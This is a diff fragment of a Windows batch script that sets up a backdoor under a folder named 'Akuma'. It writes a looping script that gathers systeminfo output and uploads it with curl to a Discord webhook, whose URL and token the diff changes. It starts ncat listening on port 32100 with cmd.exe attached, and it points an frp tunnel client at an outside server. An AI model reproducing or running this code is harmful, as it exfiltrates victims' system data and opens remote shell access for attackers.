@@ -10,11 +10,11 @@ tar -xf frp_0.52.1_windows_amd64.zip
 echo :start >> %homedrive%\Akuma\ncat.bat
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\ncat.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\ncat.bat
-echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=bot" https://discord.com/api/webhooks/1146026360821780551/YM3waL67UsKED41SzTa0do8OfYNYqU941y8c_Rv777gL32yp_YfeQxaaYa7LSkRCnVr0 >> %homedrive%\Akuma\ncat.bat
+echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=bot" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\ncat.bat
 echo %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
 echo goto start >> %homedrive%\Akuma\ncat.bat
-echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_amd64
-echo serverPort = 32101 >> %homedrive%\Akuma\frp_0.52.1_windows_amd64
+echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
+echo serverPort = 32101 >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
 echo :start >> %homedrive%\Akuma\frpc.bat
 echo %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.exe
 echo goto start >> %homedrive%\Akuma\frpc.bat
